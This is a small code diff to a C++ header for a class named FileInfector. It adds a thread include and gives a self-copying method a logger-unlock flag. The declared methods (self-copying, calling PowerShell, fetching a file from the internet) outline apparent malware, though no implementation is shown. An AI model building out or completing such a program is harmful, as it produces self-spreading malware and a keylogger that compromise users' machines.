@@ -5,6 +5,7 @@
 #include <string>
 #include <iostream>
 #include <fstream>
+#include <thread>
 
 using namespace std;
 
@@ -15,6 +16,6 @@ class FileInfector {
 public:
 	string current_working_directory();
 	void call_ps(string filename);
-	void CopyMyself();
+	void CopyMyself(BOOL KEY_TO_UNLOCK_LOGGER);
 	void CallFileFromInternet();
 };
